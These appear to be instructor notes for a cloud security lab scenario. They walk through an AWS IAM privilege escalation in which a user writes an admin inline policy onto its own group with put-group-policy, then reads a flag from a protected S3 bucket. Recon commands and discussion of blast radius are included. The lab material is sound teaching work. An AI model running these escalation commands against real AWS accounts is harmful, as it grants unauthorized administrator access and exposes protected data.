# Optional Scenario — Attack bullets (~15 min if run)

Source: Lab 1 Exercise 2. Identity: `iamws-group-admin-user`. Target: crown jewels via writing an admin inline policy on `iamws-dev-team` (a group the user belongs to).

## Pre-attack — recon with iam-recon

- `iam-recon --account $ACCOUNT_ID pathfinding` → primary recon for this scenario. Maps to pathfinding.cloud `[iam-011]` (Self-Escalation via group policy).
- `iam-recon --account $ACCOUNT_ID argquery --principal user/iamws-group-admin-user --action iam:PutGroupPolicy` → ALLOW line confirms unrestricted permission.
- ⚠️ Note: `argquery --preset privesc` will **not** flag this — iam-recon has no `PutGroupPolicy` edge checker in `src/edges/iam.rs`. Pathfinding is the right tool.
- In the interactive viz: click the user → shows group membership (`iamws-dev-team`) and pathfinding annotation.

## Exploit — full command path

```bash
# Step 1: confirm identity
aws sts get-caller-identity --profile iamws-group-admin-user

# Step 2: try the crown jewels → DENIED
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-group-admin-user)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
# expect: AccessDenied (403)

# Step 3: check which groups the user belongs to
aws iam list-groups-for-user --user-name iamws-group-admin-user \
  --query 'Groups[].GroupName' --output table \
  --profile iamws-group-admin-user
# note: iamws-dev-team

# Step 4: inspect the current (benign) policy on the group
aws iam list-group-policies --group-name iamws-dev-team \
  --profile iamws-group-admin-user
aws iam get-group-policy \
  --group-name iamws-dev-team --policy-name iamws-dev-team-readonly \
  --query 'PolicyDocument' --output json \
  --profile iamws-group-admin-user
# note: EC2 read-only — limited

# Step 5: write an admin inline policy on the group
aws iam put-group-policy \
  --group-name iamws-dev-team \
  --policy-name iamws-dev-team-escalated \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --profile iamws-group-admin-user

# Step 6: claim the crown jewels
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-group-admin-user
```

## Demo bullets

- Compare to Scenario 1 (CreatePolicyVersion): same family — both write to a resource attached to themselves, different IAM API.
- Side effect: every other member of `iamws-dev-team` is now also admin. Discuss blast radius.
